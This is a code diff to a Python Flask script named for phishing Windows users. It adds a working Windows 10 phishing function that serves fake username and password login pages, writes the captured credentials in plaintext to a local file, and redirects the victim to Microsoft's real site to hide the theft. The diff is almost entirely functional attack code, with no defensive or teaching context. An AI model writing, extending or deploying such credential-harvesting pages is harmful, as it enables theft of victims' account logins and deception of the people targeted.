@@ -67,7 +67,27 @@ def phishing_windows_11():
     app.run(port=5000)
 
 def phishing_windows_10():
-    print("Próximamente, phishing para Windows 10")
+    app = Flask(__name__)
+
+    @app.route('/')
+    def index():
+        return render_template('username10.html')
+
+    @app.route('/username', methods=['POST'])
+    def username():
+        username = request.form['username']
+        return render_template('password10.html', username=username)
+
+    @app.route('/login', methods=['POST'])
+    def login():
+        username = request.form['username']
+        password = request.form['password']
+        # Guardar los datos en un archivo
+        with open('credentials.txt', 'a') as f:
+            f.write(f'Username: {username}, Password: {password}\n')
+        return redirect('https://www.microsoft.com/en-us/windows')
+
+    app.run(port=5000)
 
 def phishing_windows_xp():
     print("Próximamente, phishing para Windows XP")
